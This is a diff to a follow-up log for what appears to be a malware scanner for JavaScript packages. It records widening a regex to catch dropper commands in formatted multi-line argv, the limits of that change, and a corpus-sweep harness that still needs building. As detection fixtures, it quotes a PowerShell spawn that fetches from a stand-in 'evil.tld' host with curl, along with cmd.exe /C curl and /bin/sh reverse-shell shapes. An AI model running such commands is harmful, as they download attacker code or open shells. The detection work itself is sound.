@@ -2909,7 +2909,7 @@ each is a separate rule family with its own calibration burden. Ranked by severi
 
 ## Open follow-ups (surfaced by the F38 shell-narrowing pass, not yet worked)
 
-- F43. [ ] **The payload arms stop at the end of the line, and real source is
+- F43. [x] **The payload arms stop at the end of the line, and real source is
   formatted** — arms 2 and 3 read from the call's opening quote to at most
   `SHELL_COMMAND_WINDOW` characters, bounded to one LINE. That bound is what
   keeps the check inside its own statement, and it is right for a minified
@@ -2924,6 +2924,65 @@ each is a separate rule family with its own calibration burden. Ranked by severi
   small multi-line window (the call's own argv rarely exceeds ~6 lines) against
   the same 2,080-package corpus before widening anything, and worth pinning the
   gap with a currently-failing-by-design fixture either way.
+  **Done — widened, and the newline is not free.** The two payload gaps now use
+  `_SHELL_COMMAND_GAP`, an alternation rather than a wider class: branch 1 is
+  the pre-F43 `[^\n]{0,200}?` window byte for byte (so a minified bundle matches
+  exactly what it matched before), and branch 2 crosses up to
+  `SHELL_ARGV_LINES` = 6 further lines **only through `[^\n;{}()=]`**. That
+  class is the whole design. A formatted argv is quotes, commas, brackets and
+  flags and passes it; the *next* statement is a call, an assignment or a block,
+  and cannot be reached — which is precisely the failure that made a plain
+  `[\s\S]` window unacceptable. The task's `spawn("cmd.exe", ["/C", "curl …"])`
+  is now reported formatted as well as on one line, and so is the PowerShell
+  `-enc` argv.
+  **The measurement is smaller than the task asked for, and that is stated
+  rather than papered over.** Old-vs-new over **500 installed packages /
+  13,769 real `.js` files / 259 MB**: **0** new hits. Two attempts at the full
+  7,576-package corpus this machine holds did not finish — the first aborted
+  with `MemoryError` on an oversized bundle after ~3h (no new-only hit up to
+  that point, but the coverage is unquantified so it is not claimed), the second
+  was I/O-starved at ~11s of CPU per 40min of wall clock. Throughput is
+  unchanged: **1.25s new vs 1.26s old** over 30.4 MB of real bundles.
+  Because the corpus sample is smaller, the cross-statement cost is pinned by
+  **fixtures instead of by the sample**: 4 negatives (semicolon-terminated, ASI
+  with a following call, a following assignment, a block boundary), a
+  `SHELL_ARGV_LINES` bound test (4 lines hits, 40 lines does not), and the
+  formatted positives for both the POSIX and PowerShell arms. The pre-existing
+  `next`/`vite`/`app-builder-lib` benign fixtures already include the
+  multi-line formatted `spawn("cmd.exe", ["/C", editor])` — the shape most at
+  risk — and stay clean. **7 new test cases**; full suite **3,764 passed /
+  2 skipped** (was 3,759); ruff + mypy gates clean; no doc drift (the row is not
+  named in RULES.md/THREAT_MODEL.md).
+  _(commit CO_MMIT)_
+
+## Open follow-ups (surfaced by the F43 formatted-argv pass, not yet worked)
+
+- F58. [ ] **A formatted argv that assigns before it downloads is still
+  invisible** — branch 2 excludes `=` and `;` so that it cannot walk into the
+  next statement, and the price is exact: a payload whose argv *contains* one of
+  them before the payload token is missed when the call is split over lines.
+  Measured end to end — `spawn("powershell.exe", [\n "-Command",\n "$u='http://evil.tld'; curl $u"\n])`
+  yields no `shell process spawned`, while the identical call on one line does
+  (branch 1 allows both characters). Not a regression — pre-F43 *both* forms
+  past the first line were missed — but it is the sharp edge of the chosen
+  class, and it is the shape a real dropper takes once it needs a variable. The
+  tractable fix is not a wider class: it is to let branch 2 cross `=`/`;` only
+  while inside an unclosed `[`, which regex cannot express and a two-pass
+  bracket scan can. Worth deciding whether that scan belongs here at all before
+  building it.
+
+- F59. [ ] **The corpus sweep this repo keeps citing cannot actually be run on
+  this machine** — F43 needed the 2,080-package re-measurement F38 established
+  as the bar and could not get it: two full sweeps over the 7,576 installed
+  packages on `G:` failed, one on `MemoryError` reading a >8 MB bundle, one on
+  I/O starvation (~11s CPU per 40min wall clock). Every calibration follow-up
+  from here on will hit the same wall, and the honest fix is a **checked-in
+  corpus harness** rather than an ad-hoc script rewritten each run: a
+  `scripts/corpus_sweep.py` that takes a root list, caps per-file size, streams
+  progress, **persists the file inventory** so a second run does not re-walk,
+  and writes a machine-readable old-vs-new diff. Cheap to build, and it turns
+  "measured over N packages" from a claim each pass has to re-earn into a
+  command anyone can re-run.
 
 - F44. [ ] **A reverse shell whose binary is a variable is invisible** — arm 1
   requires the shell name as a string literal (`spawn('/bin/sh', [])`). The same
